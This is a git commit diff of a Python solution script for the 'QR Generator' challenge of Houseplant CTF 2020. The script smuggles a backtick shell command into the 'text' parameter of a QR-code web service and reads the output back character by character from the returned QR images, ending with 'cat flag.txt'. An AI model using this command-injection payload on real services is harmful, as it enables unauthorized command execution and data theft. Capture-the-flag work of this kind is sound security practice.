10059179213c43baae957b527276a54c7775a103
Dmitriy Rodionov <57829161+Burgos1337@users.noreply.github.com>
2020-09-13 00:20:06 +0300

    Houseplant CTF 2020 writeups added

--- 2020/Houseplant CTF 2020/QR Generator/get_flag.py
+++ 2020/Houseplant CTF 2020/QR Generator/get_flag.py
@@ -11,12 +11,11 @@ def execute_command(command):
     i = 1
     while latest_char != '' and latest_char != '\n':
        payload = f'`{command} | tr "\\n" " " | cut -c {i}-{i}`'
-       r = requests.get(URL, params={'text': payload})
+       r = requests.get(URL, params = {'text': payload})
        qr_code = Image.open(BytesIO(r.content))
        latest_char = decodeQR(qr_code)[0].data.decode('utf-8')
        result += latest_char
        print(result)
        i += 1
 
-#execute_command('ls')
 execute_command('cat flag.txt')
